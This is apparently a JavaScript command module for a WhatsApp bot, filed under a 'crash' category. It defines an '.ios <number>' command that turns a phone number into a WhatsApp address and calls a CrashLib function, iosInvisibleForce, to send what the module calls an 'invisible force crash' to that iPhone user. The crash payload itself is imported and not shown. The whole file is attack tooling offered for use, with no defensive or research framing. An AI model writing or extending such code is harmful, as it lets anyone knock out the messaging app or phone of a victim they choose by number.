'use strict';
const { CrashLib } = require('../../lib/crashlib');

module.exports = {
    name: 'ios',
    aliases: ['ioscrash', 'iosforce'],
    category: 'crash',
    desc: 'ɪᴏs ɪɴᴠɪsɪʙʟᴇ ғᴏʀᴄᴇ ᴄʀᴀsʜ',
    usage: '.ios <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}ios <number>\n📝 *Example:* ${prefix}ios 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        await sock.sendMessage(ctx.from, { text: '💥 sᴇɴᴅɪɴɢ ɪᴏs ᴄʀᴀsʜ...' }, { quoted: msg });
        
        try {
            await crashLib.iosInvisibleForce(target);
            return sock.sendMessage(ctx.from, { text: '✅ ɪᴏs ᴄʀᴀsʜ sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};